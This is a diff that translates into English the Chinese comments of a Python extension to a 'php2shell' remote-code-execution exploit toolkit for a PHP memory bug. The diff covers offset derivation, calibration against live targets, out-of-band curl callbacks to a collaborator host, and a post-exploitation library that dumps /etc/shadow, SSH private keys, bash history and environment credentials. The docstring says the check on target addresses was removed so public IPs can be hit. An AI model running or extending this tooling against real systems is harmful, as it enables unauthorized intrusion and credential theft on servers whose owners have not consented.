@@ -1,31 +1,31 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-p2s_ext.py —— php2shell 工具扩展 v2
+p2s_ext.py -- php2shell toolkit extension v2
 =================================
-三个子命令，解决「换一个 PHP 版本/构建就打不动」的问题：
+Three subcommands that fix "the exploit stops working as soon as the PHP version/build changes":
 
-  symbols   从 libphp.so **符号表**确定性推导 zif_system / zval_ptr_dtor 偏移
-            （不猜版本号、不看发行版；支持本机文件或 docker 容器内自动抽取），
-            产出 profile JSON 骨架。
-  calibrate 只标定**分配器相关**的未知量（ht_size / htdata_offset / stage2_t），
-            oracle = 目标侧命令执行后 HTTP 回读标记文件（与版本无关的客观证据）。
-  postex    RCE 成立后的攻击动作库（≤14B 命令），逐条回读校验 + 产物落盘 +
-            凭据线索聚合。
+  symbols   deterministically derive zif_system / zval_ptr_dtor offsets from the libphp.so **symbol table**
+            (no version guessing, no distro lookup; supports a local file or auto-extraction inside a docker container),
+            and emit a profile JSON skeleton.
+  calibrate calibrate only the **allocator-related** unknowns (ht_size / htdata_offset / stage2_t);
+            oracle = HTTP readback of the marker file after target-side command execution (version-independent objective evidence).
+  postex    attack action library once RCE works (≤14B commands), per-action readback verification + artifact write-out +
+            credential-clue aggregation.
 
-为什么是两段式
-  网络侧不可直接读远端 .so 时，版本号/发行版只能给出「大概率」；
-  而 zif_system 与 zval_ptr_dtor 的偏移是**构建产物属性**，一旦拿到 .so 就是确定的。
-  剩下真正需要试错的只有「167 字节槽位在目标分配器里落在哪」——这才是标定的范围。
-  实测例：PHP 8.2.12(bookworm) zif=0x398EC0 dtor=0x4807D0；
-          PHP 8.4.26(trixie)  zif=0x465370 dtor=0x65EB60 —— 同族不同构建，偏移不同。
+Why two stages
+  When the network side cannot read the remote .so directly, the version/distro only yields a "most likely";
+  whereas the zif_system and zval_ptr_dtor offsets are **build-artifact properties**, fixed once you have the .so.
+  The only thing left that truly needs trial and error is "where the 167-byte slot lands in the target allocator" -- that is the scope of calibration.
+  Measured examples: PHP 8.2.12(bookworm) zif=0x398EC0 dtor=0x4807D0;
+          PHP 8.4.26(trixie)  zif=0x465370 dtor=0x65EB60 -- same family, different builds, different offsets.
 
-命令长度硬约束
-  zif_system 收到的命令上限 14 字节（ht_size 167 − 0x98 − 1）。库内命令全部 ≤14B，
-  用 glob（cat /etc/p*>p）与短重定向压长度；不提供持久化/横向/清痕类动作。
+Hard command-length constraint
+  The command zif_system receives is capped at 14 bytes (ht_size 167 - 0x98 - 1). All library commands are ≤14B,
+  length is squeezed with globs (cat /etc/p*>p) and short redirections; no persistence/lateral-movement/anti-forensics actions are provided.
 
-护栏
-  已移除地址范围校验：公网 IP 可直接作为目标，授权责任由使用者承担。
+Guardrails
+  Address-range validation has been removed: public IPs can be used as targets directly, and authorization responsibility rests with the user.
 """
 import argparse
 import io
@@ -43,18 +43,18 @@ sys.path.insert(0, HERE)
 sys.path.insert(0, os.path.join(HERE, "..", "poc_eness"))
 
 import php2shell_rce as R            # noqa: E402  (parse_target)
-MAX_CMD = 14  # 兼容旧默认（ht_size=167）
+MAX_CMD = 14  # keeps the legacy default (ht_size=167)
 
 
 def cmd_cap(prof):
-    """按 profile 的 ht_size 计算命令容量：cap = ht_size - 0x98 - 1"""
+    """Compute command capacity from the profile's ht_size: cap = ht_size - 0x98 - 1"""
     try:
         hs = int(prof.get("ht_size") or 167)
     except Exception:
         hs = 167
     return hs - 0x98 - 1
 
-# 已知可用基线（bookworm / PHP 8.4.26 实测拿下；换构建后需重新 calibrate）
+# Known-good baseline (bookworm / PHP 8.4.26 confirmed in practice; re-calibrate after a build change)
 BASE_PROFILE = {
     "name": "bookworm-8.4.26",
     "ht_size": 167,
@@ -74,10 +74,10 @@ def http_get(url, timeout=8.0):
 
 
 def hits(code, body, baseline=None, expect=None):
-    """Objective oracle: 200 + 非空 + 非软404 + 可选内容特征。
+    """Objective oracle: 200 + non-empty + not soft-404 + optional content signature.
 
-    注意：只看「200 且非空」会被站点的软 404 / 兜底页骗过，真实站点上必须带
-    expect（例如 id 的 uid=\\d+）或与随机不存在路径的响应做对比。
+    Note: looking only at "200 and non-empty" is fooled by a site's soft 404 / fallback page; on real sites you must pass
+    expect (e.g. uid=\\d+ for id) or compare against the response for a random non-existent path.
     """
     if code != 200 or not body:
         return False
@@ -93,7 +93,7 @@ def hits(code, body, baseline=None, expect=None):
 
 
 def soft404_baseline(url):
-    """取一个随机不存在路径的 200 响应体，用于识别「全站 200」的软 404。"""
+    """Fetch the 200 response body of a random non-existent path, used to detect a "site-wide 200" soft 404."""
     probe = url.rstrip("/") + "/p2s-nx-%d" % (int(time.time() * 1000) % 10 ** 8)
     code, body = http_get(probe)
     return body if code == 200 and body else b""
@@ -126,34 +126,34 @@ def do_symbols(a):
         cp = subprocess.run(["docker", "cp", f"{cname}:{rel}", dst],
                             capture_output=True, text=True)
         if cp.returncode != 0:
-            print(f"[symbols] docker cp 失败：{cp.stderr.strip()[:200]}")
+            print(f"[symbols] docker cp failed: {cp.stderr.strip()[:200]}")
             return 2
         path = dst
     if not path or not os.path.exists(path):
-        print("[symbols] 需要 --elf <libphp.so> 或 --docker <container[:path]>")
+        print("[symbols] need --elf <libphp.so> or --docker <container[:path]>")
         return 2
 
     syms = readelf_symbols(path)
     zif = syms.get("zif_system")
     dtor = syms.get("zval_ptr_dtor")
     if zif is None or dtor is None:
-        print("[symbols] 未找到 zif_system / zval_ptr_dtor —— 二进制可能被 strip。"
-              "可改用带符号的 debug 构建，或退回 calibrate 盲搜")
+        print("[symbols] zif_system / zval_ptr_dtor not found -- the binary may be stripped. "
+              "Use a debug build with symbols, or fall back to a brute-force calibrate")
         return 4
 
     prof = dict(BASE_PROFILE)
     prof.update({"zif_offset": zif, "dtor_offset": dtor, "elf": path,
                  "name": os.path.basename(path).replace(".so", ""),
                  "calibrated": False, "source": "symbols:%s" % path})
-    # 顺带读版本串，便于归档
+    # Also read the version string, for archiving
     v = subprocess.run(["strings", "-a", path], capture_output=True, text=True).stdout
-    # 版本串取"最频繁候选"，而非首个匹配：libphp 内嵌大量第三方版本串，首个匹配常是错的
+    # Take the "most frequent candidate" version string, not the first match: libphp embeds many third-party version strings, so the first match is often wrong
     cands = re.findall(r"PHP[/ ](\d+\.\d+\.\d+)", v or "")
     if cands:
         from collections import Counter
         cnt = Counter(cands)
         prof["php_hint"] = cnt.most_common(1)[0][0]
-        print(f"[symbols] 版本候选 top3：{cnt.most_common(3)}")
+        print(f"[symbols] top3 version candidates: {cnt.most_common(3)}")
 
     print(f"[symbols] {path}")
     print(f"  zif_system    = {zif:#x}")
@@ -163,11 +163,11 @@ def do_symbols(a):
         os.makedirs(os.path.dirname(os.path.abspath(a.out)), exist_ok=True)
         with open(a.out, "w", encoding="utf-8") as f:
             json.dump(prof, f, indent=2)
-        print(f"[symbols] profile 骨架 → {a.out}（ht_size/htdata_offset 仍需 calibrate 复核）")
+        print(f"[symbols] profile skeleton -> {a.out} (ht_size/htdata_offset still need a calibrate pass)")
     return 0
 
 
-# ---------------- 单次利用（复用 CLI，避免重复实现引擎） ----------------
+# ---------------- single exploitation run (reuses the CLI, avoids reimplementing the engine) ----------------
 def cli_exploit(url, cmd, prof, rounds=1, timeout=90):
     args = [sys.executable, TOOL, "exploit", "-u", url, "-c", cmd,
             "--zif-offset", hex(prof["zif_offset"]),
@@ -187,11 +187,11 @@ def cli_exploit(url, cmd, prof, rounds=1, timeout=90):
         return ""
 
 
-_MIN_CMD_LEN = 6   # 实测：<6B 命令命中率显著下降（伪造 HashTable 尺寸相关）
+_MIN_CMD_LEN = 6   # measured: hit rate drops noticeably for commands <6B (tied to the forged HashTable size)
 
 
 def _pad_cmd(cmd, outfile):
-    """把过短的取证命令补到 >=6B：加长落盘文件名，保持页面可回读。"""
+    """Pad an over-short forensics command to >=6B: lengthen the output filename, keeping the page readable."""
     if not outfile or not cmd.endswith(">" + outfile):
         return cmd, outfile
     need = _MIN_CMD_LEN - len(cmd.encode())
@@ -203,7 +203,7 @@ def _pad_cmd(cmd, outfile):
 
 def attempt(url, prof, cmd, outfile, rounds=1, pause=0.6, tries=1,
             expect=None, baseline=None):
-    """按回读结果自动重试：单轮成功率实测约 1/6，故需要多轮 + 多次。"""
+    """Retry automatically based on the readback: single-round success is measured at about 1/6, so multiple rounds + attempts are needed."""
     body, log = b"", ""
     cmd, outfile = _pad_cmd(cmd, outfile)
     if baseline is None:
@@ -217,27 +217,27 @@ def attempt(url, prof, cmd, outfile, rounds=1, pause=0.6, tries=1,
     return False, body, log
 
 
-# ---------------- 命令库（全部 ≤14 字节） ----------------
+# ---------------- command library (all ≤14 bytes) ----------------
 LIB = [
-    ("id",        "id>i",              "i",  "进程身份"),
-    ("whoami",    "whoami>w",          "w",  "用户名"),
-    ("uname",     "uname -a>u",        "u",  "内核/发行版指纹（提权前置）"),
-    ("hostname",  "hostname>hn",       "hn", "主机名/容器 id"),
-    ("env",       "env>e",             "e",  "环境变量：DB/云 AK/SK/代理/token"),
+    ("id",        "id>i",              "i",  "process identity"),
+    ("whoami",    "whoami>w",          "w",  "user name"),
+    ("uname",     "uname -a>u",        "u",  "kernel/distro fingerprint (prerequisite for privesc)"),
+    ("hostname",  "hostname>hn",       "hn", "hostname/container id"),
+    ("env",       "env>e",             "e",  "environment variables: DB/cloud AK/SK/proxy/token"),
     ("passwd",    "cat /etc/p*>p",     "p",  "/etc/passwd"),
-    ("hosts",     "cat /etc/ho*>hs",   "hs", "/etc/hosts：内网拓扑"),
-    ("shadow",    "cat /etc/sh*>sh",   "sh", "/etc/shadow（需 root）"),
-    ("ps",        "ps>ps",             "ps", "进程表"),
-    ("ip",        "ip a>ip",           "ip", "网卡/网段"),
-    ("ss",        "ss -an>ss",         "ss", "监听端口"),
-    ("lsroot",    "ls -l />lr",        "lr", "根目录权限"),
-    ("lsetc",     "ls /etc>le",        "le", "/etc 清单"),
-    ("lsrec",     "ls -R /var>lv",     "lv", "递归 /var：应用配置"),
-    ("bashhist",  "cat ~/.b*>hb",      "hb", "bash 历史（常见明文口令）"),
-    ("sshkey",    "cat ~/.ssh/*>sk",   "sk", "SSH 私钥"),
-    ("crontab",   "crontab -l>ct",     "ct", "计划任务"),
-    ("dockersock","ls /var/run>vr",    "vr", "是否挂 docker.sock"),
-    ("logs",      "cat /var/*/*>lg",   "lg", "日志片段（可见性判断）"),
+    ("hosts",     "cat /etc/ho*>hs",   "hs", "/etc/hosts: internal network topology"),
+    ("shadow",    "cat /etc/sh*>sh",   "sh", "/etc/shadow (requires root)"),
+    ("ps",        "ps>ps",             "ps", "process table"),
+    ("ip",        "ip a>ip",           "ip", "interfaces/subnets"),
+    ("ss",        "ss -an>ss",         "ss", "listening ports"),
+    ("lsroot",    "ls -l />lr",        "lr", "root directory permissions"),
+    ("lsetc",     "ls /etc>le",        "le", "/etc listing"),
+    ("lsrec",     "ls -R /var>lv",     "lv", "recursive /var: application config"),
+    ("bashhist",  "cat ~/.b*>hb",      "hb", "bash history (often plaintext passwords)"),
+    ("sshkey",    "cat ~/.ssh/*>sk",   "sk", "SSH private keys"),
+    ("crontab",   "crontab -l>ct",     "ct", "scheduled tasks"),
+    ("dockersock","ls /var/run>vr",    "vr", "whether docker.sock is mounted"),
+    ("logs",      "cat /var/*/*>lg",   "lg", "log snippets (visibility check)"),
 ]
 
 
@@ -251,12 +251,12 @@ import http.server
 from urllib.parse import urlsplit
 
 def _insecure():
-    """--insecure / PHP2SHELL_INSECURE=1：https 目标跳过证书校验。"""
+    """--insecure / PHP2SHELL_INSECURE=1: skip certificate verification for https targets."""
     return os.environ.get("PHP2SHELL_INSECURE", "") == "1"
 
 
 def _ssl_ctx():
-    """返回可直接传给 urlopen(context=...) 的 SSLContext；未开启 insecure 时返回 None。"""
+    """Return an SSLContext that can be passed straight to urlopen(context=...); None when insecure is off."""
     if not _insecure():
         return None
     import ssl
@@ -270,7 +270,7 @@ def requests_get(url, timeout=10, **kw):
     import requests as _rq
     if _insecure():
         kw.setdefault("verify", False)
-        try:  # 跳过校验时屏蔽 InsecureRequestWarning 噪音
+        try:  # silence InsecureRequestWarning noise when verification is skipped
             import urllib3
             urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
         except Exception:
@@ -278,20 +278,20 @@ def requests_get(url, timeout=10, **kw):
     return _rq.get(url, timeout=timeout, **kw)
 
 
-HITS = []           # 带外回调命中记录
+HITS = []           # out-of-band callback hit log
 
 
 
 def load_profile(a):
-    """从 BASE_PROFILE 出发，用 --profile / CLI 覆盖构建 profile。"""
+    """Start from BASE_PROFILE and assemble the profile with --profile / CLI overrides."""
     prof = dict(BASE_PROFILE)
     path = getattr(a, "profile", None)
     if path:
         try:
             prof.update(json.load(open(path, encoding="utf-8")))
-            print(f"[*] 载入 profile：{path}")
+            print(f"[*] loaded profile: {path}")
         except Exception as e:
-            print(f"[!] profile 读取失败：{e}")
+            print(f"[!] failed to read profile: {e}")
     for key, attr in (("ht_size", "ht_size"), ("zif_offset", "zif_offset"),
                       ("dtor_offset", "dtor_offset"), ("htdata_offset", "htdata_offset"),
                       ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
@@ -323,12 +323,12 @@ def start_listener(port):
     http.server.ThreadingHTTPServer.allow_reuse_address = True
     srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), _CB)
     threading.Thread(target=srv.serve_forever, daemon=True).start()
-    # 自检：确认本进程确实收得到连接（否则后续 miss 全为假阴性）
+    # self-check: confirm this process really receives connections (otherwise every later miss is a false negative)
     try:
         import urllib.request
         urllib.request.urlopen(f"http://127.0.0.1:{port}/__selfcheck", timeout=3).read()
         ok = any(h["path"] == "/__selfcheck" for h in HITS)
-        print("[*] 监听自检：" + ("通过" if ok else "失败（端口被其他进程占用）"))
+        print("[*] listener self-check: " + ("passed" if ok else "failed (port taken by another process)"))
         if not ok:
             raise OSError("listener self-check failed")
     except Exception as e:
@@ -336,7 +336,7 @@ def start_listener(port):
     return srv
 
 
-# ---------------- 只读指纹（不触发 OOM） ----------------
+# ---------------- read-only fingerprinting (does not trigger OOM) ----------------
 def do_fingerprint(a):
     base = a.url.rstrip("/")
     ver = None
@@ -351,18 +351,18 @@ def do_fingerprint(a):
         m = re.search(rb"PHP/(\d+\.\d+\.\d+)", body) or re.search(rb"PHP Version (\d+\.\d+\.\d+)", body)
         if m:
             ver = m.group(1).decode()
-            print(f"[+] {p} 泄露版本：PHP/{ver}")
+            print(f"[+] {p} leaks the version: PHP/{ver}")
             break
         if code == 200 and p != "/":
-            print(f"[*] {p} = 200（{len(body)}B）")
-    print("[*] 路径探测结果：" + ", ".join(f"{k}={v}" for k, v in seen.items()))
-    # 全部探测路径均无响应（连接被拒 / TLS 校验失败 / 超时）⇒ 不可达，绝不能再报 LIKELY_RCE
+            print(f"[*] {p} = 200 ({len(body)}B)")
+    print("[*] path probe results: " + ", ".join(f"{k}={v}" for k, v in seen.items()))
+    # Every probed path is unresponsive (connection refused / TLS verification failure / timeout) => unreachable, never report LIKELY_RCE again
     if not seen or all((c or 0) <= 0 for c in seen.values()):
-        print("[-] 不可达：全部路径探测均无响应（连接失败/超时/TLS 校验失败）。")
+        print("[-] unreachable: all path probes got no response (connection failure/timeout/TLS verification failure).")
         if not _insecure():
-            print("    https 目标若为自签或过期证书，请加 --insecure 重试（默认严格校验证书）。")
+            print("    If the https target has a self-signed or expired certificate, retry with --insecure (strict verification is the default).")
         return 50
-    # ---- 条件3：session 消费点只读探测（不触发 OOM） ----
+    # ---- condition 3: read-only probe of the session sink (does not trigger OOM) ----
     sink_names = []
     for p in paths[: max(1, a.max_paths)]:
         try:
@@ -375,11 +375,11 @@ def do_fingerprint(a):
             if nm and nm not in sink_names:
                 sink_names.append(nm)
     if sink_names:
-        print("[+] 条件3 session 消费点：疑似存在（Set-Cookie: " + ", ".join(sink_names[:4]) + "）")
+        print("[+] condition 3 session sink: likely present (Set-Cookie: " + ", ".join(sink_names[:4]) + ")")
     else:
-        print("[-] 条件3 session 消费点：未检出（探测路径零 Set-Cookie -> 无脚本 session_start()；"
-              "109618 无悬垂落点）")
-    # 头部指纹
+        print("[-] condition 3 session sink: not detected (zero Set-Cookie on probed paths -> no script calls session_start();"
+              "109618 has no dangling sink)")
+    # header fingerprint
     try:
         r = requests_get(base + "/", timeout=a.timeout)
         print(f"[*] Server: {r.headers.get('Server','-')} | X-Powered-By: {r.headers.get('X-Powered-By','-')}")
@@ -387,29 +387,29 @@ def do_fingerprint(a):
         if m and not ver:
             ver = m.group(1)
     except Exception as e:
-        print(f"[!] 头部获取失败：{e}")
+        print(f"[!] failed to fetch headers: {e}")
     if not ver:
-        print("[!] 未取得版本：目标关闭了版本暴露。用组件情报/响应差异判定，禁止直接打 OOM（会造成 DoS）")
+        print("[!] no version obtained: the target hides its version. Decide from component intel / response differences; do not go straight for the OOM (it causes DoS)")
         return 10
-    print(f"[+] 判定版本：PHP {ver}")
+    print(f"[+] determined version: PHP {ver}")
     parts = [int(x) for x in ver.split(".")][:3]
     vuln = {"8.2": (8, 2, 35), "8.3": (8, 3, 36), "8.4": (8, 4, 27), "8.5": (8, 5, 12)}
     key = f"{parts[0]}.{parts[1]}"
     if key in vuln:
         lim = vuln[key]
         if tuple(parts) < lim:
-            print(f"[+] AFFECTED：{ver} < {'.'.join(map(str,lim))}（109618 影响区间）")
-            print("    但能否 RCE 取决于配置：post_max_size > memory_limit 且存在 session_start 消费点")
+            print(f"[+] AFFECTED: {ver} < {'.'.join(map(str,lim))} (109618 affected range)")
+            print("    Whether RCE works depends on the config: post_max_size > memory_limit and a session_start sink present")
             if not sink_names:
-                print("    [!] 未检出 Set-Cookie：若其他入口也无 session_start()，则 109618 无悬垂落点")
+                print("    [!] no Set-Cookie detected: if other entry points also lack session_start(), 109618 has no dangling sink")
             return 0
-        print(f"[-] PATCHED：{ver} >= {'.'.join(map(str,lim))}")
+        print(f"[-] PATCHED: {ver} >= {'.'.join(map(str,lim))}")
         return 30
-    print(f"[?] {ver} 不在已知矩阵内：按符号推导+标定流程自行判定")
+    print(f"[?] {ver} is not in the known matrix: decide via the symbol-derivation + calibration flow")
     return 10
 
 
-# ---------------- 盲验证：带外回调，不依赖回读通道 ----------------
+# ---------------- blind verification: out-of-band callback, no readback channel needed ----------------
 def do_blind(a):
     prof = load_profile(a)
     cap = cmd_cap(prof)
@@ -419,25 +419,25 @@ def do_blind(a):
         if len(tmpl) <= cap:
             cands.append(tmpl)
     if not cands:
-        print(f"[!] 回调命令全部超过容量 cap={cap}B（collab 需用短域名/短 IP）")
-        print(f"    例：cap=14 时可用 `curl h:9000/p1`（14B）；长域名请先提升 ht_size 或在目标上另找通道")
+        print(f"[!] every callback command exceeds capacity cap={cap}B (collab needs a short domain/short IP)")
+        print(f"    Example: with cap=14 you can use `curl h:9000/p1` (14B); for long domains raise ht_size first or find another channel on the target")
         return 2
     payload = cands[0]
-    print(f"[*] 回调命令：{payload!r}（{len(payload)}B / cap {cap}B）")
-    print(f"[*] 目标：{a.url}  ht_size={prof['ht_size']} htdata={hex(prof['htdata_offset'])}")
+    print(f"[*] callback command: {payload!r} ({len(payload)}B / cap {cap}B)")
+    print(f"[*] target: {a.url}  ht_size={prof['ht_size']} htdata={hex(prof['htdata_offset'])}")
 
     srv = None
     if a.listen:
         try:
             srv = start_listener(getattr(a, "listen_port", 9000))
-            print(f"[*] 本机回调监听：0.0.0.0:{a.listen_port}（等待目标出站连接）")
+            print(f"[*] local callback listener: 0.0.0.0:{a.listen_port} (waiting for target outbound connection)")
         except OSError as e:
-            print(f"[!] 监听 {a.listen_port} 失败（{e}）；继续发送但无法本地取证，请改用外部协作端")
+            print(f"[!] failed to listen on {a.listen_port} ({e}); sending continues but no local evidence, use an external collaborator")
             a.listen = False
 
     base = len(HITS)
     t0 = time.time()
-    # 一轮进程内多轮重试命中率远高于"每轮都新建连接"，务必一次性交给 exploit
+    # Multi-round retries inside one process hit far more often than "a new connection every round"; always hand it to exploit in one go
     cli_exploit(a.url, payload, prof, rounds=max(1, a.rounds), timeout=a.timeout)
     deadline = time.time() + a.wait
     while time.time() < deadline and len(HITS) == base:
@@ -447,13 +447,13 @@ def do_blind(a):
         srv.shutdown()
     if new:
         for h in new:
-            print(f"[+] 回调命中：{time.strftime('%H:%M:%S', time.localtime(h['t']))} "
-                  f"来自 {h['ip']} path={h['path']} ua={h['ua'][:48]!r}")
-        print("[+] 结论：命令执行成立（目标主动向协作端发起连接，无需任何回读通道）")
+            print(f"[+] callback hit: {time.strftime('%H:%M:%S', time.localtime(h['t']))} "
+                  f"from {h['ip']} path={h['path']} ua={h['ua'][:48]!r}")
+        print("[+] verdict: command execution confirmed (the target connected out to the collaborator, no readback channel needed)")
         return 0
-    print(f"[-] {int(time.time()-t0)}s 内未收到回调。可能：命令未执行 / 目标无 egress / "
-          f"curl 不存在 / 容量不足 / 前置条件不满足")
-    print("    下一步：改用时间侧信道（对比响应耗时）或申请在目标侧查看日志；不要靠盲目加轮次制造 DoS")
+    print(f"[-] no callback within {int(time.time()-t0)}s. Possible: command not executed / no egress from the target / "
+          f"curl missing / capacity too small / preconditions unmet")
+    print("    Next: switch to a timing side channel (compare response times) or ask to inspect logs on the target; do not create a DoS by blindly adding rounds")
     return 10
 
 # ---------------- calibrate ----------------
@@ -489,7 +489,7 @@ def do_calibrate(a):
 
     total = len(hts) * len(hds)
     print(f"[calibrate] {a.url} zif={prof['zif_offset']:#x} dtor={prof['dtor_offset']:#x} "
-          f"ht_size={hts} htdata={len(hds)} 个 合计 {total} 组 rounds={a.rounds}")
+          f"ht_size={hts} htdata={len(hds)} values, {total} combinations in total rounds={a.rounds}")
     n = 0
     t0 = time.time()
     for hs in hts:
@@ -499,7 +499,7 @@ def do_calibrate(a):
             tag = f"k{n}"
             print(f"  [{n}/{total}] hs={hs} htdata={hd:#x} ... ", end="", flush=True)
             if getattr(a, "dir", None):
-                # 绝对目录通道：不受 cwd 影响，oracle 直接看本机映射目录
+                # absolute directory channel: independent of cwd, the oracle reads the locally mapped directory
                 real = f"id>{a.dir.rstrip('/')}/{tag}"
                 if len(real) > cmd_cap(cand):
                     print(f"SKIP(>{cmd_cap(cand)}B)")
@@ -532,27 +532,27 @@ def do_calibrate(a):
                 with open(out, "w", encoding="utf-8") as f:
                     json.dump(cand, f, indent=2)
                 print(f"HIT → {out}")
-                print(f"[calibrate] 命中 ht_size={hs} htdata={hd:#x}；回读={cand['php_hint']}；"
-                      f"耗时 {time.time() - t0:.1f}s")
+                print(f"[calibrate] HIT ht_size={hs} htdata={hd:#x}; readback={cand['php_hint']};"
+                      f" elapsed {time.time() - t0:.1f}s")
                 return 0
             st3 = "stage3" if "Stage-3" in log else ("stage2" if "Stage-2" in log else "stage1")
             print(f"miss({st3})")
-    print(f"[calibrate] {total} 组全败（{time.time() - t0:.1f}s）；"
-          f"扩大 --htdata-window / --ht-size-* 或先用 symbols 校正 zif/dtor")
+    print(f"[calibrate] all {total} combinations failed ({time.time() - t0:.1f}s);"
+          f" widen --htdata-window / --ht-size-* or correct zif/dtor with symbols first")
     return 15
 
 
 
 def _calibrate_collab(a):
-    """用带外回调做 oracle：候选成功 = 监听器收到该候选 tag 的请求。
-    适用于真实目标（无可写目录/无回读通道），代价是每个候选都要发一轮 OOM 链。"""
+    """Use an out-of-band callback as the oracle: a candidate succeeds when the listener receives a request with that candidate's tag.
+    Suited to real targets (no writable directory/no readback channel); the cost is one OOM chain round per candidate."""
     cap = cmd_cap({"ht_size": a.ht_size})
     try:
         srv = start_listener(getattr(a, "listen_port", 9000))
     except OSError as e:
-        print(f"[!] 监听失败：{e}")
+        print(f"[!] listen failed: {e}")
         return 2
-    print(f"[*] 回调 oracle 监听 0.0.0.0:{getattr(a, 'listen_port', 9000)}；cap={cap}B")
+    print(f"[*] callback oracle listening on 0.0.0.0:{getattr(a, 'listen_port', 9000)}; cap={cap}B")
     prof = dict(BASE_PROFILE)
     prof.update({"ht_size": a.ht_size,
                  "zif_offset": a.zif_offset or BASE_PROFILE["zif_offset"],
@@ -571,12 +571,12 @@ def _calibrate_collab(a):
         tag = f"c{idx%10}{idx//10}"[:2] if cap >= 9 else f"{idx}"[-1]
         cmd = f"curl {a.collab}/{tag}"
         if len(cmd) > cap:
-            print(f"[!] 回调命令 {cmd!r} 超容量 {cap}B：请用更短的 collab/tag")
+            print(f"[!] callback command {cmd!r} exceeds capacity {cap}B: use a shorter collab/tag")
             srv.shutdown()
             return 2
         prof["htdata_offset"] = off
         base = len(HITS)
-        print(f"[*] 候选 htdata={hex(off)} tag={tag} cmd={cmd!r}", end=" ", flush=True)
+        print(f"[*] candidate htdata={hex(off)} tag={tag} cmd={cmd!r}", end=" ", flush=True)
         cli_exploit(a.url, cmd, prof, rounds=max(1, a.rounds),
                     timeout=getattr(a, "timeout", 120))
         dl = time.time() + 6
@@ -585,8 +585,8 @@ def _calibrate_collab(a):
         got = [h for h in HITS[base:] if tag in h["path"]]
         if got:
             print("HIT")
-            print(f"[+] 标定成功：ht_size={a.ht_size} htdata_offset={hex(off)} "
-                  f"（回调 {got[0]['path']} 来自 {got[0]['ip']}）")
+            print(f"[+] calibration succeeded: ht_size={a.ht_size} htdata_offset={hex(off)} "
+                  f"(callback {got[0]['path']} from {got[0]['ip']})")
             hits.append(off)
             pdir = "profiles"
             try:
@@ -600,9 +600,9 @@ def _calibrate_collab(a):
                            "stage2_t": prof.get("stage2_t"), "url": a.url,
                            "calibrated": True, "oracle": "oob-callback"},
                           open(out, "w"), indent=2)
-                print(f"[*] profile 已写入 {out}")
+                print(f"[*] profile written to {out}")
             except Exception as e:
-                print(f"[!] profile 写入失败：{e}")
+                print(f"[!] failed to write profile: {e}")
             break
         print("miss")
         idx += 1
@@ -632,7 +632,7 @@ def do_postex(a):
     channel_dir = (a.dir or "").rstrip("/")
     local_dir = a.local_dir
     if channel_dir and not local_dir:
-        print("[postex] --dir 需要同时给 --local-dir（用于回读落在宿主/本机的同一目录）")
+        print("[postex] --dir also requires --local-dir (to read back the same directory as mapped on the host/this machine)")
         return 2
 
     only = set(x.strip() for x in a.only.split(",")) if a.only else None
@@ -641,12 +641,12 @@ def do_postex(a):
     os.makedirs(outdir, exist_ok=True)
 
     print(f"[postex] {a.url} profile={prof.get('name')} ht_size={prof['ht_size']} "
-          f"htdata={prof['htdata_offset']:#x} 命令 {len(items)} 条 → {outdir}")
+          f"htdata={prof['htdata_offset']:#x} {len(items)} commands -> {outdir}")
     rows, creds = [], []
     for key, cmd, outf, desc in items:
         cap = cmd_cap(prof)
         if channel_dir:
-            # 绝对目录通道：命令写 <dir>/<outf>，回读直接读本机 <local_dir>/<outf>
+            # absolute directory channel: the command writes <dir>/<outf>, readback reads the local <local_dir>/<outf>
             real_cmd = cmd.replace(">" + outf, ">" + channel_dir + "/" + outf, 1)
             if len(real_cmd) > cap:
                 print(f"  {key:<10} {real_cmd:<18} ... SKIP(>{cap}B)")
@@ -660,7 +660,7 @@ def do_postex(a):
             ok, body = False, b""
             fp = os.path.join(local_dir, outf)
             try:
-                os.remove(fp)          # 先清残留，避免旧文件造成假命中
+                os.remove(fp)          # clear leftovers first, so an old file cannot cause a false hit
             except OSError:
                 pass
             for _ in range(max(1, a.tries)):
@@ -678,7 +678,7 @@ def do_postex(a):
                 f.write(body)
             tag = f"OK {len(body)}B"
             if CRED_PAT.search(body):
-                tag += " ⚠凭据线索"
+                tag += " !credential clue"
                 creds.append(key)
             print(tag)
             rows.append({"key": key, "cmd": cmd, "desc": desc, "status": "OK",
@@ -694,33 +694,33 @@ def do_postex(a):
                    "credential_like": creds,
                    "ts": time.strftime("%Y-%m-%dT%H:%M:%S")}, f, indent=2, ensure_ascii=False)
     good = [r for r in rows if r["status"] == "OK"]
-    print(f"\n[postex] 成功 {len(good)}/{len(rows)}；报告 {rp}")
+    print(f"\n[postex] succeeded {len(good)}/{len(rows)}; report {rp}")
     if creds:
-        print(f"[postex] 凭据类线索出现在: {', '.join(creds)}")
+        print(f"[postex] credential-like clues found in: {', '.join(creds)}")
     if a.cleanup:
         names = [it[2] for it in items]
         for i in range(0, len(names), 3):
             cli_exploit(a.url, "rm " + " ".join(names[i:i + 3]), prof, rounds=1)
             time.sleep(a.pause)
-        print("[postex] 已投递清理（rm 分批，≤14B）")
+        print("[postex] cleanup delivered (rm in batches, ≤14B)")
     return 0 if good else 20
 
 
 # ---------------------------------------------------------------- oneclick
-# 已知构建 profile 库：键为 PHP 版本串。命中即免手工传参。
+# Known-build profile DB: keys are PHP version strings. A hit means no manual parameters.
 PROFILE_DB = {
     "8.4.26": dict(ht_size=167, htdata_offset=0x690D8, zif_offset=0x465370,
                    dtor_offset=0x65EB60, stage2_t=406, rce_ok=True,
-                   label="php:8.4.26-apache (Debian trixie) 实测 RCE 可用，cap=14B"),
+                   label="php:8.4.26-apache (Debian trixie) RCE confirmed in practice, cap=14B"),
     "8.2.12": dict(ht_size=167, htdata_offset=0x690D8, zif_offset=0x398EC0,
                    dtor_offset=0x4807D0, stage2_t=406, rce_ok=False,
-                   label="PHP 8.2.12(NTS) 实测 Stage-1 泄漏必失败 → 仅 DoS 可证"),
+                   label="PHP 8.2.12(NTS) in practice the Stage-1 leak always fails -> only DoS is provable"),
 }
 
 
-# ---------------- 外部 profile 库（profiles.json） ----------------
-# 搜索顺序：包内 profiles.json -> ~/.php2shell/profiles.json -> ./profiles.json
-# 格式示例：
+# ---------------- external profile store (profiles.json) ----------------
+# Search order: bundled profiles.json -> ~/.php2shell/profiles.json -> ./profiles.json
+# Format example:
 # {"8.2.34": {"ht_size":167, "htdata_offset":"0x690D8", "zif_offset":"0x398EC0",
